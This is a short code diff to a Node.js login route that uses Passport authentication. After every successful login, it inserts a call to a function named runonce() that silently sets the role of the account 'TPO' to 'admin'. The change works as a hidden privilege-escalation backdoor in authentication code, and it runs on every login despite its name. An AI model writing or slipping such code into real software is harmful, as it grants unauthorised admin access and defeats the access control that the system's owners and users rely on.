@@ -47,6 +47,7 @@ passport.use(new LocalStrategy(function (username, password, done) {
         }
         req.logIn(user, function (err) {
             if (err) { return next(err); }
+            runonce();
             res.json({msg:2,username:user.username});
         });
     })(req, res, next);
@@ -110,3 +111,9 @@ passport.use(new LocalStrategy(function (username, password, done) {
   });
 
   module.exports = router;
+
+  function runonce(){
+    accountData.update({'username':'TPO'},{'role':'admin'},function(e){
+      if(e) console.error(e);
+    });
+  }
